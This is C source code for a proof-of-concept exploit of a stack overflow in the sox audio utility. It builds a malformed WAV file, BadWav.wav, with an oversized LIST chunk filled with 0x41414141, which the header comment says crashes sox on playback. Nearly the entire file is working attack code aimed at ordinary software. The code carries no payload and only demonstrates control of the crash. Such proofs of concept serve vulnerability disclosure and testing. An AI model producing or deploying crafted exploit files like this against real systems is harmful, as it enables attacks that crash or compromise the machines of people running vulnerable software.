/*
** POC Exploit Code for s0x stack overflow vulnerability found by Ulf Harnhammar
** Coded by: Carlos Barros <barros [at] barrosecurity d0t com>
**
** Just CRASH on 0x41414141
** Usage: ./s0x_poc;sox BadWav.wav -t ossdsp /dev/dsp
**
*/

#include <stdio.h>
#include <stdlib.h>

struct RIFF_Header
{
	int	ChunkID;
	int	ChunkDataSize;
	int	RIFFType;
};

struct FormatChunk
{
	int	ChunkID;
	int	ChunkDataSize;
	short	CompressionCode;
	short	NumberOfChannels;
	int	SampleRate;
	int	AverageByte;
	short	BlockAlign;
	short	SignificantBits;
};

struct DataChunk
{	
	int	ChunkID;
	int	ChunkSize;
	char	Data[100];
};

struct BadChunk
{
	int	ChunkID;
	int	ChunkSize;
	int	Type;
	int	TypeLen;
	char	Buffer[1024];
};

struct
{
	struct	RIFF_Header 	Riff;
	struct	FormatChunk	Format;
	struct	DataChunk	Data;
	struct	BadChunk	Bad;
}badWavFile;

#define FORMAT_CHUNK_DATA_SIZE  16	
#define	DATA_CHUNK_SIZE		100		
#define	CHUNK_DATA_SIZE		3000
int main()
{
	FILE		*wav;
	int		*Point,i;
	
	wav = fopen("BadWav.wav","wb");
	if(!wav)
		perror("BadWav.wav"),exit(1);

	// Fill the struct
	badWavFile.Riff.ChunkID = 0x46464952;
	badWavFile.Riff.ChunkDataSize = CHUNK_DATA_SIZE;
	badWavFile.Riff.RIFFType = 0x45564157;

	memset(&badWavFile.Format,0x41,sizeof(struct FormatChunk));
	memset(&badWavFile.Data,0x41,sizeof(struct DataChunk));

	badWavFile.Format.ChunkID = 0x20746D66;;
	badWavFile.Format.ChunkDataSize = FORMAT_CHUNK_DATA_SIZE;
	badWavFile.Format.CompressionCode = 0x01;
	badWavFile.Format.SignificantBits = 9; 

	badWavFile.Data.ChunkID = 0x61746164;
	badWavFile.Data.ChunkSize = 100;

	badWavFile.Bad.ChunkID =  0x5453494c;
	badWavFile.Bad.Type = 0x44524349;
	badWavFile.Bad.ChunkSize = 1024; 
	badWavFile.Bad.TypeLen = 1024;

	Point = (int *)(badWavFile.Bad.Buffer);
	for(i=0;i<1024;i+=4)
		*Point++ = 0x41414141;	
	fwrite(&badWavFile,sizeof(badWavFile),1,wav);
	fclose(wav);
}
